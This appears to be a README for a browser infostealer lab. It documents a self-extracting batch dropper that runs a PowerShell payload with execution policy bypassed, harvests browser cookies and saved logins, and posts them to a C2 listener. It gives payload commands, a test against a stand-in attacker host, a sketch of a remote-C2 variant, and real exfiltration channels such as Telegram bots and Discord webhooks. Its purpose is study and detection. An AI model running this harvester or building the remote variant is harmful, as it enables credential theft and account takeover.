# C2 lab — cookie/saved-login harvest + exfiltration simulation

> **AUTHORIZED USE ONLY.** This lab is a study tool for your own machine and
> your own lab infrastructure. Only harvest credentials from machines you own
> or are explicitly authorized to test. Running this against anyone else's
> device is a crime — the same tool that is a teaching aid here is malware when
> pointed at someone's machine. The authors are not responsible for misuse.

The lab lets you study the full **harvest → phone-home** chain a real stealer
uses, **without ever sending a secret off your own machine**. Everything ships
as plain files — no installer, no third-party binaries:

| File | What it is |
|------|-----------|
| `c2_sim.cmd` | One-file deliverable: self-extracts an embedded PowerShell payload and exfils the report over **Windows loopback** to a receiver on the same host. |
| `c2_payload.ps1` | The embedded payload itself, runnable directly with flags (Firefox + Chrome + Edge harvester + C2 POST). |
| `kali_receiver.py` | Receiver for the loopback sim (run on the Kali/WSL side of the same machine). |

The Python tool `creds_dumper.py` (see `README.md`) is the same harvester in
Python, cross-platform, with **Chrome/Edge** support. The PowerShell lab below
is the single-file / zero-install variant and covers **Firefox + Chrome + Edge**
(Chrome/Edge decryption in pure PowerShell: DPAPI unwrap + AES-GCM via
`bcrypt.dll` P/Invoke — no `.NET` `AesGcm`, which PS 5.1 lacks).

---

## Localhost simulation: `c2_sim.cmd` (the one and only variant)

`c2_sim.cmd` is the ONE file to copy to the lab Windows machine — a
self-extracting batch file that emulates the full stealer behavior, exfiling
the report over **Windows loopback to a receiver on the same physical host**:

1. Double-click `c2_sim.cmd`.
2. It slices the embedded PowerShell payload out of its own bytes (between the
   `REM @PS1_BEGIN` / `REM @PS1_END` markers) and writes it to
   `%TEMP%\c2_payload.ps1`.
3. Runs it with `-ExecutionPolicy Bypass`, then deletes the temp payload in a
   `finally` (verified: temp file gone after the run).
4. The payload harvests Firefox + Chrome + Edge cookies and saved logins from
   disk and POSTs the full report JSON to **`http://localhost:48732/c2`**
   (a realistic `POST /c2`
   callback). Windows `localhost` is forwarded into WSL2 by default
   (`localhostForwarding=true`), so the report lands on the Kali receiver on
   that same host. Pass `-NoExfil` instead to run a receiver on **127.0.0.1
   only** and print the callback in the same console window. No report file is
   ever written to disk.

**Kali side — start the receiver first** (run it in the lab folder so
`received_cookies.jsonl` is written alongside your other artifacts):

```bash
python3 kali_receiver.py              # binds 0.0.0.0:48732
python3 kali_receiver.py --port 8080  # or a custom port
```

Every POST is printed to stdout and appended as one JSON line to
`received_cookies.jsonl` in the current directory.

**Full proof is a two-terminal, one-machine flow:** run `kali_receiver.py` in a
Kali/WSL terminal, then double-click `c2_sim.cmd` on the same machine's Windows
side. The report arrives on the Kali receiver with no internet or LAN involved.

**Safety enforcement (cannot be disabled):**

- The exfil target is gated to **localhost only** — `$Exfil` must be
  `http://127.0.0.1` or `http://localhost` (any port). Any other target makes
  the payload print a refusal and exit code 1; nothing is transmitted.
- The report therefore never leaves the physical machine: Windows loopback →
  WSL2 on the same host. No internet, no LAN, no remote C2.
- No report is written to disk; the only file ever created is the transient
  `%TEMP%\c2_payload.ps1`, deleted afterwards.
- Primary Password profiles are **skipped silently** (no Read-Host prompt), the
  same way real harvesters behave. Pass `-Password` if you want them decrypted.

**Direct payload invocation** (flags the double-click path doesn't pass):

```powershell
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -Password "..."   # decrypt Primary-Password-protected logins
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -Plain            # show full cookie/login values
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -Profile C:\path  # single profile
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -NssPath C:\path\nss3.dll
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -NoExfil          # localhost-only C2 simulation
powershell -ExecutionPolicy Bypass -File c2_payload.ps1 -Exfil http://localhost:9000/c2  # custom local target
```

### Validated behavior

| Test | Result |
|------|--------|
| Payload parse (PowerShell 5.1 / Core) | 0 parser errors |
| Fixture 59 (no Primary Password) | 4/4 logins decrypted to exact known plaintexts; report posted; callback shown |
| Fixture 144 with `-Password` | 4/4 logins decrypted; report posted |
| Fixture 144 without `-Password` | No prompt, no hang, "Saved logins: none", still posts |
| Temp payload cleanup | `%TEMP%` payload deleted after run (finally block) |
| Exfil E2E → Kali receiver | `-Port 48732` + default `$Exfil` → `HTTP 200`; `received_cookies.jsonl` captured |
| Safety gate | `-Exfil "http://evil.example.com/c2"` → refusal printed, exit code 1, nothing sent |
| `-NoExfil` regression | fresh port → self-receive callback printed, "This callback stayed on this machine." |

---

## Design note: what an external (remote-C2) variant would look like

This repo intentionally ships **no remote-exfiltration variant** — the lab is
localhost-only so nothing can ever leave your machine. For understanding, an
external twin would differ from `c2_sim.cmd` in exactly four ways:

1. **Default `$Exfil`** — `https://<your-domain>/c2` instead of
   `http://localhost:48732/c2`, where `<your-domain>` is an HTTPS front door
   you control.
2. **Safety gate widened** to allow exactly two targets: the original
   `http://127.0.0.1` / `http://localhost`, plus `https://<your-domain>`.
   Anything else → refusal + exit code 1.
3. **Shared-token auth** — the POST carries an `X-Lab-Token` header that the
   remote receiver requires (wrong/missing → 403).
4. **Receiver** — a small token-gated HTTP listener bound to `127.0.0.1`
   behind a reverse proxy (e.g. Caddy for automatic TLS), so it is never
   exposed as a raw internet port.

The payload's harvest + report code would be byte-identical; only the POST
target, allowlist, and header change. We deliberately do not ship those files —
a public repo that can be finished into a working remote-exfil stealer in two
minutes helps nobody, including you. Build it locally if you ever need it for
a sanctioned engagement; keep it out of git.

---

## Real-world exfil channels (study notes)

Real stealer malware doesn't use loopback. The channels you'll see in the wild
are roughly (in rough order of prevalence):

1. **HTTPS C2 POST** — a JSON/blob POST to a `.php` / `.asp` / random path on
   the attacker's box. Encrypted, looks like normal web traffic to a network
   observer.
2. **Telegram Bot API** — `https://api.telegram.org/bot<token>/sendDocument`.
   Free, hard to attribute, huge rate tolerance. Extremely common in hobby
   stealers.
3. **Discord webhooks** — `https://discord.com/api/webhooks/<id>/<token>`.
   Also free; the classic "log stealer" channel.
4. **DNS OOB (DNS exfil)** — the victim encodes data into a hostname and
   queries the attacker's authoritative NS (`data.<tld>`). Great for bypassing
   HTTP egress filters; small per-query payload, needs TXT/A encoding.
5. **SMTP** — stolen logs emailed to a burner account. Old-school, still seen.
6. **Pastebin / gist / file.io** — paste services as dead drops.
7. **WebSocket / WebRTC** — realtime channels, harder to spot in HTTP logs.

**Detection lesson for the defensive side:** the channel itself is rarely what
gets a stealer caught — the **file-read chain + the outbound POST** is. A
browser process reading `cookies.sqlite`/`logins.json` and then a process
sending a POST to a never-seen host is the behavioral signature EDR/ASR and
Defender look for. That's why the "harvest + phone-home" pair in this lab is
the part worth studying — it's the part that matters in detection.

---

## Reading the output

- `Cookies: N total, M high-value session tokens` — the high-value ones are
  session bearer tokens (e.g. Facebook `c_user`+`xs`, GitHub `user_session`,
  LinkedIn `li_at`). Those are the account-takeover tokens.
- `Saved logins: N` — hostname / username / password, decrypted via Firefox's
  own crypto library (NSS). Only appears if you chose "remember password" in
  Firefox.
- The captured report contains every secret in plaintext — **treat every
  capture like a password vault. Delete it, rotate the token, never replay a
  session you don't own.**

---

## Professional use: authorization first

Holding a cert does **not** authorize testing — contracts do. Before this
technique ever touches anything you don't own:

1. **Signed authorization** (SOW / RoE / penetration-testing agreement) naming
   the specific assets, the test window, and who approved it.
2. **Data-handling rules** — harvested cookies/sessions are live credentials.
   The lab convention here (delete the capture, rotate the token, never replay
   a session you don't own) is the same discipline a professional keeps for
   client engagement data.
3. **Deletion** — treat every capture like a password vault. Shred, rotate,
   and never leave copies lying around.

This repo is your own-machine lab. Pointed at client infrastructure without a
signed scope, the same tool is malware. The lab is safe and self-contained;
the abuse is a choice made outside it.
